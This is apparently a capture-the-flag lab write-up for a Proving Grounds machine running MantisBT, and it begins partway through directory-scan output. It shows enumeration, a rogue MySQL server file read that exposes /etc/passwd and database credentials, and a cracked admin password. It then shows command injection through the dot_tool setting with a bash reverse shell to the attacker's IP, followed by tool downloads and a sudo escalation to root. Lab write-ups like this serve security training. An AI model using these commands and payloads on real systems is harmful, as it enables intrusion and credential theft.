500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/current_user_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/project_hierarchy_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/plugin_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/date_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/prepare_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/sponsorship_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/helper_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/bugnote_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/custom_field_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/billing_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/api_token_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/email_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/json_api.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/cfdefs/cfdef_standard.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/project_api.php
200      GET      685l    57230w   391622c http://192.168.127.204/bugtracker/fonts/fontawesome-webfont.svg
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/MantisEnum.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/MantisCorePlugin.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/AuthFlags.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/Avatar.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/IssueTagTimelineEvent.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/MantisFormattingPlugin.class.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/MantisColumn.class.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/TimelineEvent.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/IssueCreatedTimelineEvent.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/MantisWikiPlugin.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/IssueAssignedTimelineEvent.class.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/MantisFilter.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/IssueStatusChangeTimelineEvent.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/IssueMonitorTimelineEvent.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/IssueNoteCreatedTimelineEvent.class.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/Tokenizer.class.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/MantisCoreWikiPlugin.class.php
200      GET      244l     1170w     8888c http://192.168.127.204/bugtracker/library/securimage/README.md
200      GET       37l      193w    14138c http://192.168.127.204/bugtracker/library/securimage/securimage_play.swf
200      GET     2754l    11484w   159933c http://192.168.127.204/bugtracker/library/securimage/AHGBold.ttf
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/logging_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/timeline_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/antispam_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/session_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/ldap_api.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/constant_inc.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/last_visited_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/collapse_api.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/filter_constants_inc.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/excel_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/custom_function_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/graphviz_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/layout_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/file_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/version_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/bug_api.php
301      GET        9l       28w      342c http://192.168.127.204/bugtracker/library/utf8/utils => http://192.168.127.204/bugtracker/library/utf8/utils/
200      GET       59l      355w    12128c http://192.168.127.204/bugtracker/images/mantis_logo.gif
200      GET       74l      449w    34220c http://192.168.127.204/bugtracker/images/mantis_logo.png
200      GET       12l       37w     2233c http://192.168.127.204/bugtracker/images/avatar.png
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/plugins/MantisCoreFormatting/MantisCoreFormatting.php
200      GET        3l        7w      233c http://192.168.127.204/bugtracker/css/images/ui-bg_flat_10_000000_40x100.png
200      GET       18l      122w     8200c http://192.168.127.204/bugtracker/css/images/ui-icons_228ef1_256x240.png
200      GET        5l       13w      470c http://192.168.127.204/bugtracker/css/images/ui-bg_highlight-soft_75_ffe45c_1x100.png
200      GET       20l       82w    10410c http://192.168.127.204/bugtracker/css/images/ui-bg_gloss-wave_35_f6a828_500x100.png
200      GET        3l        7w      383c http://192.168.127.204/bugtracker/css/images/ui-bg_highlight-soft_100_eeeeee_1x100.png
200      GET        3l       10w      506c http://192.168.127.204/bugtracker/css/images/ui-bg_glass_100_fdf5ce_1x400.png
200      GET        4l        6w      167c http://192.168.127.204/bugtracker/css/images/ui-bg_glass_75_dadada_1x400.png
200      GET       30l      184w    12523c http://192.168.127.204/bugtracker/css/images/pattern.jpg
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-xmlschema.inc.php
301      GET        9l       28w      335c http://192.168.127.204/bugtracker/admin/check => http://192.168.127.204/bugtracker/admin/check/
301      GET        9l       28w      342c http://192.168.127.204/bugtracker/library/rssbuilder => http://192.168.127.204/bugtracker/library/rssbuilder/
200      GET       82l      456w     3291c http://192.168.127.204/bugtracker/library/utf8/README
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/MantisPlugin.class.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/classes/ConfigParser.class.php
301      GET        9l       28w      350c http://192.168.127.204/bugtracker/library/phpmailer/language => http://192.168.127.204/bugtracker/library/phpmailer/language/
301      GET        9l       28w      341c http://192.168.127.204/bugtracker/library/phpmailer => http://192.168.127.204/bugtracker/library/phpmailer/
301      GET        9l       28w      342c http://192.168.127.204/bugtracker/library/disposable => http://192.168.127.204/bugtracker/library/disposable/
200      GET        1l        1w        7c http://192.168.127.204/bugtracker/library/phpmailer/VERSION
301      GET        9l       28w      340c http://192.168.127.204/bugtracker/library/utf8/exp => http://192.168.127.204/bugtracker/library/utf8/exp/
301      GET        9l       28w      347c http://192.168.127.204/bugtracker/plugins/XmlImportExport => http://192.168.127.204/bugtracker/plugins/XmlImportExport/
301      GET        9l       28w      353c http://192.168.127.204/bugtracker/plugins/XmlImportExport/pages => http://192.168.127.204/bugtracker/plugins/XmlImportExport/pages/
301      GET        9l       28w      332c http://192.168.127.204/bugtracker/api/soap => http://192.168.127.204/bugtracker/api/soap/
301      GET        9l       28w      352c http://192.168.127.204/bugtracker/plugins/XmlImportExport/lang => http://192.168.127.204/bugtracker/plugins/XmlImportExport/lang/
301      GET        9l       28w      332c http://192.168.127.204/bugtracker/api/rest => http://192.168.127.204/bugtracker/api/rest/
301      GET        9l       28w      348c http://192.168.127.204/bugtracker/library/phpmailer/extras => http://192.168.127.204/bugtracker/library/phpmailer/extras/
200      GET      504l     4372w    26432c http://192.168.127.204/bugtracker/library/utf8/LICENSE
301      GET        9l       28w      340c http://192.168.127.204/bugtracker/plugins/Gravatar => http://192.168.127.204/bugtracker/plugins/Gravatar/
301      GET        9l       28w      345c http://192.168.127.204/bugtracker/plugins/Gravatar/lang => http://192.168.127.204/bugtracker/plugins/Gravatar/lang/
200      GET      504l     4372w    26421c http://192.168.127.204/bugtracker/library/phpmailer/LICENSE
[####################] - 2m    360606/360606  0s      found:388     errors:4514   
[####################] - 2m     30000/30000   280/s   http://192.168.127.204/ 
[####################] - 7s     30000/30000   4264/s  http://192.168.127.204/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4261/s  http://192.168.127.204/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4261/s  http://192.168.127.204/img/showcase/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   352941/s http://192.168.127.204/img/team/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4259/s  http://192.168.127.204/img/blog/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4260/s  http://192.168.127.204/img/testimonial/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   236220/s http://192.168.127.204/img/contact/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   48232/s http://192.168.127.204/fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   10787/s http://192.168.127.204/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2m     30000/30000   271/s   http://192.168.127.204/bugtracker/ 
[####################] - 8s     30000/30000   3574/s  http://192.168.127.204/bugtracker/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2m     30000/30000   241/s   http://192.168.127.204/bugtracker/admin/ 
[####################] - 8s     30000/30000   3548/s  http://192.168.127.204/bugtracker/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   11732/s http://192.168.127.204/bugtracker/scripts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   6464/s  http://192.168.127.204/bugtracker/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   17626/s http://192.168.127.204/bugtracker/plugins/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 6s     30000/30000   4827/s  http://192.168.127.204/bugtracker/lang/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   5613/s  http://192.168.127.204/bugtracker/library/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   17172/s http://192.168.127.204/bugtracker/doc/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8s     30000/30000   3968/s  http://192.168.127.204/bugtracker/core/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 6s     30000/30000   4995/s  http://192.168.127.204/bugtracker/fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2m     30000/30000   242/s   http://192.168.127.204/bugtracker/library/disposable/ 
[####################] - 2m     30000/30000   235/s   http://192.168.127.204/bugtracker/library/phpmailer/
```

This came with a lot of information including an /bugtracker endpoint an exposed /admin panel.

The webpage seems to be running an Web Application called "Mantis Bug Tracker".

Unfortunately we don't get precise version information, but at /bugtracker/doc/ace-theme-license.txt endpoint we discovered that the license became active at 30. June 2016.

Searching up for that, we discovered that it's most likely

```
MantisBT 1.3.4
```

## Vulnerability Assessment

Searching for CVE's.

```
searchsploit Mantis                
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Mantis Bug Tracker 0.15.x/0.16/0.17.x - JPGraph Remote File Inclusion Command Execution                     | php/webapps/21727.txt
Mantis Bug Tracker 0.19 - Remote Server-Side Script Execution                                               | php/webapps/24390.txt
Mantis Bug Tracker 0.19.2/1.0 - 'Bug_sponsorship_list_view_inc.php' File Inclusion                          | php/webapps/26423.txt
Mantis Bug Tracker 0.x - Multiple Cross-Site Scripting Vulnerabilities                                      | php/webapps/24391.txt
Mantis Bug Tracker 0.x - New Account Signup Mass Emailing                                                   | php/webapps/24392.php
Mantis Bug Tracker 0.x/1.0 - 'manage_user_page.php?sort' Cross-Site Scripting                               | php/webapps/27229.txt
Mantis Bug Tracker 0.x/1.0 - 'view_all_set.php' Multiple Cross-Site Scripting Vulnerabilities               | php/webapps/27228.txt
Mantis Bug Tracker 0.x/1.0 - 'View_filters_page.php' Cross-Site Scripting                                   | php/webapps/26798.txt
Mantis Bug Tracker 0.x/1.0 - Multiple Input Validation Vulnerabilities                                      | php/webapps/26172.txt
Mantis Bug Tracker 1.1.1 - Code Execution / Cross-Site Scripting / Cross-Site Request Forgery               | php/webapps/5657.txt
Mantis Bug Tracker 1.1.3 - 'manage_proj_page' PHP Code Execution (Metasploit)                               | php/remote/44611.rb
Mantis Bug Tracker 1.1.3 - Remote Code Execution                                                            | php/webapps/6768.txt
Mantis Bug Tracker 1.1.8 - Cross-Site Scripting / SQL Injection                                             | php/webapps/36068.txt
Mantis Bug Tracker 1.2.0a3 < 1.2.17 XmlImportExport Plugin - PHP Code Injection (Metasploit) (1)            | multiple/webapps/41685.rb
Mantis Bug Tracker 1.2.0a3 < 1.2.17 XmlImportExport Plugin - PHP Code Injection (Metasploit) (2)            | php/remote/35283.rb
Mantis Bug Tracker 1.2.19 - Host Header                                                                     | php/webapps/38068.txt
Mantis Bug Tracker 1.2.3 - 'db_type' Cross-Site Scripting / Full Path Disclosure                            | php/webapps/15735.txt
Mantis Bug Tracker 1.2.3 - 'db_type' Local File Inclusion                                                   | php/webapps/15736.txt
Mantis Bug Tracker 1.3.0/2.3.0 - Password Reset                                                             | php/webapps/41890.txt
Mantis Bug Tracker 1.3.10/2.3.0 - Cross-Site Request Forgery                                                | php/webapps/42043.txt
Mantis Bug Tracker 2.24.3 - 'access' SQL Injection                                                          | php/webapps/49340.py
Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)                                          | php/webapps/48818.py
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

I decided to enumerate further on the /admin endpoint, since I was kinda stuck on trying all of these exploits and they didn't work.

Discovered an exposed /install.php 

```
dirsearch -u http://192.168.240.204/bugtracker/admin
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Mantis/reports/http_192.168.240.204/_bugtracker_admin_26-01-01_08-13-20.txt

Target: http://192.168.240.204/

[08:13:20] Starting: bugtracker/admin/
[08:13:23] 403 -  280B  - /bugtracker/admin/.ht_wsr.txt                     
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccess.bak1                  
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccess.orig                  
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccess.sample                
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccess_extra
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccess_orig
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccess_sc
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccessBAK
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccess.save
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccessOLD
[08:13:23] 403 -  280B  - /bugtracker/admin/.htaccessOLD2
[08:13:23] 403 -  280B  - /bugtracker/admin/.html                           
[08:13:23] 403 -  280B  - /bugtracker/admin/.htm                            
[08:13:23] 403 -  280B  - /bugtracker/admin/.htpasswd_test                  
[08:13:23] 403 -  280B  - /bugtracker/admin/.htpasswds
[08:13:23] 403 -  280B  - /bugtracker/admin/.httr-oauth
[08:13:24] 403 -  280B  - /bugtracker/admin/.php                            
[08:13:34] 301 -  335B  - /bugtracker/admin/check  ->  http://192.168.240.204/bugtracker/admin/check/
[08:13:40] 200 -    2KB - /bugtracker/admin/install.php                     
[08:13:40] 200 -    2KB - /bugtracker/admin/install.php?profile=default     
                                                                             
Task Completed
```

## Initial Access

After searching for some more CVE's for Mantis I discovered an interesting CVE-2017-12419 Arbitrary Fileread which is connected to the install.php and MySQL, it relies on a mysql server trick. We can run up an Fake MySQL Server and get Mantis to connect to it. If the admin directory is still present, the install.php will happily talk to that fake server and let's us view files on the target server.

Fake MySQL Server:

```
wget https://raw.githubusercontent.com/allyshka/Rogue-MySql-Server/refs/heads/master/roguemysql.php
```

Started up malicious arbitrary file read mysql server.

```
php roguemysql.php      
Enter filename to get [/etc/passwd] > /etc/passwd
[.] Waiting for connection on 0.0.0.0:3306
```

Send an request from the mantis target install.php to our listening mysql fake server.

```
curl 'http://192.168.240.204/bugtracker/admin/install.php?install=3&hostname=192.168.45.191'
```

Retrieved Users running on the target system.

```
php roguemysql.php      
Enter filename to get [/etc/passwd] > /etc/passwd
[.] Waiting for connection on 0.0.0.0:3306
[+] Connection from 192.168.240.204:37502 - greet... auth ok... some shit ok... want file... 
[+] /etc/passwd from 192.168.240.204:37502:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mantis:x:1000:1000::/home/mantis:/bin/bash
```

Since we got file read now, let's view the bugtracker configuration file which we discovered earlier, but weren't able to view.

```
Enter filename to get [/bugtracker/config/config_inc.php] > /var/www/html/bugtracker/config/config_inc.php
[.] Waiting for connection on 0.0.0.0:3306
[+] Connection from 192.168.240.204:37592 - greet... auth ok... some shit ok... want file... 
[+] /var/www/html/bugtracker/config/config_inc.php from 192.168.240.204:37592:
<?php
$g_hostname               = 'localhost';
$g_db_type                = 'mysqli';
$g_database_name          = 'bugtracker';
$g_db_username            = 'root';
$g_db_password            = 'SuperSequelPassword';

$g_default_timezone       = 'UTC';

$g_crypto_master_salt     = 'OYAxsrYFCI+xsFw3FNKSoBDoJX4OG5aLrp7rVmOCFjU=';
```

Let's connect to the mysql database running with root:SuperSequelPassword

```
MariaDB [bugtracker]> SELECT * FROM mantis_user_table;
+----+---------------+----------+----------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
| id | username      | realname | email          | password                         | enabled | protected | access_level | login_count | lost_password_request_count | failed_login_count | cookie_string                                                    | last_visit | date_created |
+----+---------------+----------+----------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
|  1 | administrator |          | root@localhost | c7870d0b102cfb2f4916ff04e47b5c6f |       1 |         0 |           90 |           5 |                           0 |                  0 | Tgl-0N5B643JKwIwNgD9s5dKRU_gdBsXawwO7p3ZaGM2ZI4gckyB84AmBRq-IFA7 | 1651296959 |   1651292492 |
+----+---------------+----------+----------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
1 row in set (0.035 sec)
```

Retrieved encoded admin password.


```
administrator:c7870d0b102cfb2f4916ff04e47b5c6f
```

Went to www.crackstation.net and cracked the password.

```
administrator:prayingmantis
```

Logged into the CMS and created an Project.

Enumerated CMS to check if we have file write access.

Couldn't retrieve anything. So I checked out CVE's for MantisBT 2.5.2 and discovered CVE-2019-15715.

Which is an post-auth exploit for admin users. It explains that by abusing certain configuration options inside dot_tool & neato_tool, we can inject commands into the server. The PoC looks like this:

1. Enable graphs
2. Set dot_tool to a malicious command
3. Trigger the workflow graph to execute it.

Let's do it!

Navigated to Manage > Manage Configuration > Configuration Report > Create Configuration Option

1. The following values, will enable graph functionality.

```
Configuration Option: relationship_graph_enable
Type: integer
Value: 1
```

2. Configured another Configuration Option with the following values:

```
Configuration Option: dot_tool
Type: string
Value: /bin/bash -c "bash -i >& /dev/tcp/192.168.45.191/80 0>&1"
```

3. Starting up listener on port 80.

```
nc -lvnp 80
```

4. Triggered the graph execution by visiting the following endpoint in the browser.

```
http://192.168.240.204/bugtracker/workflow_graph_img.php
```

Gained RCE as user "www-data".

```
nc -lvnp 80 
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.240.204] 60750
bash: cannot set terminal process group (1216): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mantis:/var/www/html/bugtracker$
```

Retrieved local.txt in /home/mantis directory.

```
404f01ef653db51407a76c103139e927
```

## Privilege Escalation

Downloaded linpeas.sh onto the target server.

```
www-data@mantis:/tmp$ wget http://192.168.45.191/linpeas.sh
wget http://192.168.45.191/linpeas.sh
--2026-01-01 14:38:48--  http://192.168.45.191/linpeas.sh
Connecting to 192.168.45.191:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971820 (949K) [application/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  5%  746K 1s
    50K .......... .......... .......... .......... .......... 10% 1.63M 1s
   100K .......... .......... .......... .......... .......... 15% 1.81M 1s
   150K .......... .......... .......... .......... .......... 21% 2.28M 1s
   200K .......... .......... .......... .......... .......... 26% 2.30M 0s
   250K .......... .......... .......... .......... .......... 31% 1.40M 0s
   300K .......... .......... .......... .......... .......... 36%  114K 1s
   350K .......... .......... .......... .......... .......... 42%  746K 1s
   400K .......... .......... .......... .......... .......... 47% 1.93M 1s
   450K .......... .......... .......... .......... .......... 52% 8.67M 1s
   500K .......... .......... .......... .......... .......... 57% 1.91M 1s
   550K .......... .......... .......... .......... .......... 63% 2.24M 0s
   600K .......... .......... .......... .......... .......... 68% 2.34M 0s
   650K .......... .......... .......... .......... .......... 73% 1.93M 0s
   700K .......... .......... .......... .......... .......... 79% 2.19M 0s
   750K .......... .......... .......... .......... .......... 84% 2.32M 0s
   800K .......... .......... .......... .......... .......... 89% 2.27M 0s
   850K .......... .......... .......... .......... .......... 94% 2.35M 0s
   900K .......... .......... .......... .......... ......... 100% 1.74M=0.9s

2026-01-01 14:38:49 (1003 KB/s) - 'linpeas.sh' saved [971820/971820]
```

Gave it executable permissions.

```
chmod +x linpeas.sh
```

linpeas wasn't able to find anything, let's observe hidden running processes.

Downloaded pspy64s for this.

```
www-data@mantis:/tmp$ wget http://192.168.45.191/pspy64s
wget http://192.168.45.191/pspy64s
--2026-01-01 14:43:41--  http://192.168.45.191/pspy64s
Connecting to 192.168.45.191:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1233888 (1.2M) [application/octet-stream]
Saving to: 'pspy64s'

     0K .......... .......... .......... .......... ..........  4%  734K 2s
    50K .......... .......... .......... .......... ..........  8%  984K 1s
   100K .......... .......... .......... .......... .......... 12%  661K 1s
   150K .......... .......... .......... .......... .......... 16% 1.51M 1s
   200K .......... .......... .......... .......... .......... 20% 6.74M 1s
   250K .......... .......... .......... .......... .......... 24% 6.13M 1s
   300K .......... .......... .......... .......... .......... 29% 1.61M 1s
   350K .......... .......... .......... .......... .......... 33% 1.24M 1s
   400K .......... .......... .......... .......... .......... 37% 28.0K 4s
   450K .......... .......... .......... .......... .......... 41%  587K 3s
   500K .......... .......... .......... .......... .......... 45% 4.52M 3s
   550K .......... .......... .......... .......... .......... 49% 2.47M 2s
   600K .......... .......... .......... .......... .......... 53% 2.30M 2s
   650K .......... .......... .......... .......... .......... 58% 1.01M 2s
   700K .......... .......... .......... .......... .......... 62% 1.58M 1s
   750K .......... .......... .......... .......... .......... 66% 1.95M 1s
   800K .......... .......... .......... .......... .......... 70% 1.09M 1s
   850K .......... .......... .......... .......... .......... 74% 1.54M 1s
   900K .......... .......... .......... .......... .......... 78% 1.25M 1s
   950K .......... .......... .......... .......... .......... 82% 1.11M 1s
  1000K .......... .......... .......... .......... .......... 87% 1.31M 0s
  1050K .......... .......... .......... .......... .......... 91% 1.63M 0s
  1100K .......... .......... .......... .......... .......... 95% 1.55M 0s
  1150K .......... .......... .......... .......... .......... 99% 2.15M 0s
  1200K ....                                                  100% 2.32M=2.6s

2026-01-01 14:43:44 (460 KB/s) - 'pspy64s' saved [1233888/1233888]
```

Gave pspy64s executable permissions.

```
chmod +x pspy64s
```

There seems to be an binary mysqldump being ran with plain text credentials of the user "mantis".

Logged into user "mantis" with mantis:BugTracker007.

Checked sudo permissions for the user:

```
mantis@mantis:~/db_backups$ sudo -l
sudo -l
[sudo] password for mantis: BugTracker007

Matching Defaults entries for mantis on mantis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mantis may run the following commands on mantis:
    (ALL : ALL) ALL
```

Logged into user "root".

```
mantis@mantis:~/db_backups$ sudo su
sudo su
root@mantis:/home/mantis/db_backups#
```

Retrieved proof.txt in /root directory.

```
66b96f0a72414fd41cb89a560d357ecb
```
